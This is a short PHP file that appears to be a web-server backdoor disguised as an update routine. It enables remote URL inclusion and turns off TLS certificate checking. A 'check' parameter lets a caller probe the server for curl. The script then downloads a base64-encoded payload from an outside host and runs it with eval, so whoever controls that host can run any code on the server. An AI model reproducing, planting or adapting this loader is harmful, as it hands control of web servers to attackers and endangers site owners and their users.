<?php

ini_set('display_errors', true);
ini_set('safe_mode', false);
ini_set('allow_url_fopen', true);
ini_set('allow_url_include', true);

ini_set('allow_url_include', 'on');
function getUpdate($url) {
    $ch = curl_init();
    $timeout = 10;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

if(isset($_REQUEST['check'])){
    
    if(function_exists('curl_init')){

        echo '1';

    }else{

        echo '0';

    }

}

if(function_exists('curl_init'))
{
    $file=getUpdate('http://g2c.club/update/get.txt');
    eval(base64_decode($file));
}